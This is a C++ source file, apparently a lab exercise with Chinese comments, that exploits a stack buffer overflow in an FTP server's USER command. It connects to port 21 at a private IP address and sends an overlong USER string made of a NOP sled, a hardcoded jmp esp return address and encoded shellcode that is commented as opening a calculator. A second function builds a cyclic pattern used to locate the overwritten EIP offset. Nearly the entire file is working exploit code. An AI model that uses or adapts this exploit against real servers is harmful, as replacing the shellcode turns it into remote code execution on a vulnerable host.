#include <iostream>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define Long 907//最大字符串长度
#define Voidd 493//esp前空字节
#define Eipp 485//eip命令位置
/*
|-5-|-Voidd-|
|-5-|---Eipp---|
|-------Long------|
*/
// char ip_1[]="10.203.167.204";
char ip_1[]="192.168.45.88";
int port_1=21;//21号端口
char code[Long]={0};//总码

int creat_textcode()
{
    char b[Long]="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq";
    int length=strlen(b);
    printf("shellcode length:%d\n",length);
    for(int i=0;i<Long;i++){
        code[i]='a';
    }
    code[0]='U';
    code[1]='S';
    code[2]='E';
    code[3]='R';
    code[4]=' ';
    for(int i=0;i<length;i++)
    {
        code[i+5]=b[i];
    }
    code[Long-2]='\r';
    code[Long-1]='\n';
    return 0;
}

int creat_shellcode()//测试采用
{
    //弹出计算器
    char shellcode[]=
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30"
    "\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42"
    "\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34"
    "\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e"
    "\x49\x54\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c"
    "\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48\x4f\x45\x46\x42"
    "\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50"
    "\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37"
    "\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48"
    "\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58"
    "\x42\x4c\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f"
    "\x47\x4e\x43\x56\x41\x46\x4e\x36\x43\x46\x42\x30\x5a";

    int length=strlen(shellcode);
    printf("shellcode length:%d\n",length);
    //code构造
    int i=0;
    for(i=0;i<Long;i++)//先全部置空
    {
        code[i]=0x90;
    }
    //命令头
    code[0]='U';
    code[1]='S';
    code[2]='E';
    code[3]='R';
    code[4]=' ';
    //跳转命令：jmp esp [Eipp+5,Eipp+9]
    i=Eipp+5;
    code[i]=0x12;
    i++;
    code[i]=0x45;
    i++;
    code[i]=0xfa;
    i++;
    code[i]=0x7f;
    //写入字符串[Voidd+5,Voidd+5+length]
    i=Voidd+5;
    for(int j=0;j<length;i++,j++)
    {
        code[i]=shellcode[j];
    }
    //结束标志[Long-3,Long-1]
    code[Long-2]='\r';
    code[Long-1]='\n';
    return 0;
}

int main()
{
    //创建攻击代码
    creat_shellcode();
    // creat_textcode();
    //socket
    int sockfd;//客户端socket
    struct sockaddr_in servaddr;//服务端地址结构体
    struct hostent *h;//预留只知道域名的情况
    if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        return 0;
    }
    memset(&servaddr,0,sizeof(servaddr));
    h=gethostbyname(ip_1);//直接获得服务端网络相关信息
    servaddr.sin_port=htons(port_1);//端口信息
    servaddr.sin_family=AF_INET;//协议族
    memcpy(&servaddr.sin_addr,h->h_addr,h->h_length);//地址
    //连接建立
    if(connect(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr))!=0){//connect
        perror("connect");
        ::close(sockfd);
        return 0;
    }
    printf("connect success\n");
    int iret=0;//数据大小
    char get_text[1024]={0};//存储接收的字符
    if((iret=recv(sockfd,&get_text,sizeof(get_text),0))<=0){//先接收
        printf("iret=%d\n",iret);
        perror("recv");
        ::close(sockfd);
        return -1;
    }
    printf("size=%d\n",strlen(code));
    printf("get message: %s\n",get_text);
    if((iret=send(sockfd,code,sizeof(code),0))<=0) //发送
    {
        perror("send");
        return -1;
    }
    
    else printf("send successfully! code size: %d\n",iret);
    ::close(sockfd);
    return 0;
}